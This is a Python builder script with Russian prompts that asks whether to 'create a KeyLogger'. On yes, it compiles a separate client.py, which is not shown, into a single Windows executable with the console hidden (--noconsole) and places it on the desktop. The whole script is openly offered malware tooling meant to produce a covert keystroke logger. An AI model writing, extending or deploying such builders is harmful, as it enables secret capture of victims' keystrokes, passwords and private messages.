from pystyle import Colors, Colorate, Center
from colorama import Fore, init
from pathlib import Path
import platform
import os

Error = Colors.red + "[-]" + Colors.reset
Success = Colors.green + "[+]" + Colors.reset
Info = Colors.blue + "[*]" + Colors.reset

init(autoreset=True)


def get_desktop_path():
    home = Path.home()
    if platform.system() == "Windows":
        return home / "Desktop"
    else:
        pass


def compile_to_exe():
    if platform.system() == "Windows":
        try:
            import PyInstaller
        except ImportError:
            print(Colors.red + f"{Error} PyInstaller не установлен. Установите его: pip install pyinstaller" + Colors.reset)
            return
        
        try:
            os.system("pyinstaller --onefile --noconsole client.py")
        except Exception as e:
            print(f"Ошибка при конвертации файла в EXE: {e}")
        
        desktop = get_desktop_path()
        exe_src = Path("dist/client.exe")
        exe_dest = desktop / "client.exe"
        
        if exe_src.exists():
            exe_src.replace(exe_dest)
            print(f"{Success} файл был удачно конвертирован в EXE и перенесен на рабочий стол: {exe_dest}")
        else:
            print(Colors.red + f"{Error} Ошибка: EXE не найден в папке dist/" + Colors.red)
    else:
        print(Colors.red + "Этот скрипт работает только на Windows!" + Colors.reset)


def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + """
    ███████████              ███      █████                   
    ░░███░░░░░███            ░░░      ░░███                    
    ░███    ░███ █████ ████ ████   ███████   ██████  ████████ 
    ░██████████ ░░███ ░███ ░░███  ███░░███  ███░░███░░███░░███
    ░███░░░░░███ ░███ ░███  ░███ ░███ ░███ ░███████  ░███ ░░░ 
    ░███    ░███ ░███ ░███  ░███ ░███ ░███ ░███░░░   ░███     
    ███████████  ░░████████ █████░░████████░░██████  █████    
    ░░░░░░░░░░░    ░░░░░░░░ ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░░  
             
            [https://github.com/DenisPythoneer]                                                                                     
    """)


def user_input():
    display_banner()
    user_input = input(f"\n{Info} Создать KeyLogger? (Yes/No): ").lower()
    if user_input == 'yes':
            compile_to_exe()
    else:
        print(Colors.green + "До свидания!" + Colors.reset)


def main():
    user_input()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colors.green + "\nДо свидания!" + Colors.reset)
